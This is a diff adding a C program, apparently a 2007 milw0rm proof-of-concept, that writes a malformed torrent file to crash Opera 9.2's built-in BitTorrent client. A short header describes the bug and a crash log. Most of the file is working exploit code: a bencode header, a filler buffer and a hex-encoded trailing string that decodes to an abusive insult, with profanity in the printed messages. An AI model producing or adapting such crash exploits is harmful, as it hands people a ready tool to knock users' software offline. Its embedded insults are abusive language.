@@ -1,0 +1,113 @@
+/************************************************************************
+
+
+* Created Date :April 23 2007
+*
+* Credits go to n00b for finding this vulnerability and writing p0c.
+* Moderator of http://igniteds.net
+*
+* 0pera 9.2 torrent file remote dos exploit.
+*
+* opera has its own bit torrent client with-in the web browser
+* it is possible to crash opera with a malformed torrent file
+* causing denial of service to legitimate users..Opera will
+* use 100% cpu till the inevitable happens..Which will be a crash
+* To fix this problem disable the bitorrent with in opera..
+*
+* Tested : win xp service pack 1 and 2
+*
+* I wasn't able to catch any debugging info I'm afraid maybe some one
+* else can give it a go.
+*
+* All i was able to get from drwatson pmsl was.
+************************************************************************
+
+* Application exception occurred:
+* App: C:\Program Files\Opera\Opera.exe (pid=1084)
+* When: 4/22/2007 @ 14:55:29.296
+* Exception number: 80000003 (hard coded breakpoint)
+************************************************************************
+
+* Seams like some sort of memory leak with the bitorrent client
+* of opera..
+************************************************************************
+
+********************************
+**/
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void usage(char* file);
+
+char header[] = "\x64\x38";
+
+char My_buff[] =
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+ "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+ "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+ "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+ "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+ "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+ "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+ "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+ "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+ "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
+
+char trailing_buff[] =
+"\x36\x31\x3a\x09\x44\x69\x65\x20\x6f\x70\x65\x72\x61"
+ "\x20\x79\x6f\x75\x20\x73\x6c\x75\x74";
+
+int main(int argc,char* argv[])
+{
+ system("cls");
+
+ printf("\n *************************************************");
+ printf("\n * Opera torrent file dos exploit by n00b *");
+ printf("\n *************************************************");
+ printf("\n * Shouts to every one at milw0rm *");
+ printf("\n *************************************************");
+ printf("\n * Special thanks to str0ke *");
+ printf("\n * *");
+ printf("\n * Date :Aprill 23 2007 *");
+ printf("\n *************************************************");
+ printf("\n * CREDITS TO n00b FOR FINDING THIS BUG *");
+ printf("\n *************************************************");
+
+ if ( argc!=2 )
+ {
+ usage(argv[0]);
+ }
+
+ FILE *f;
+ f = fopen(argv[1],"w");
+ if ( !f )
+ {
+ printf("\nFuck some thing went wrong :D");
+ exit(1);
+ }
+
+ printf("\n\nMaking torrent file...");
+
+ fwrite(header,1,sizeof(header),f);
+
+ fwrite(My_buff,1,sizeof(My_buff),f);
+
+ fwrite(trailing_buff,1,sizeof(trailing_buff),f);
+
+ printf("\nDone hoooooha!");
+ printf("\n ");
+ printf("\n0h noes memory leak pmsl !!");
+ return 0;
+}
+
+void usage(char* file)
+{
+
+ printf("\n\nusage: n00b.exe opera.torrent");
+ exit(1);
+}
+
+// milw0rm.com [2007-04-23]
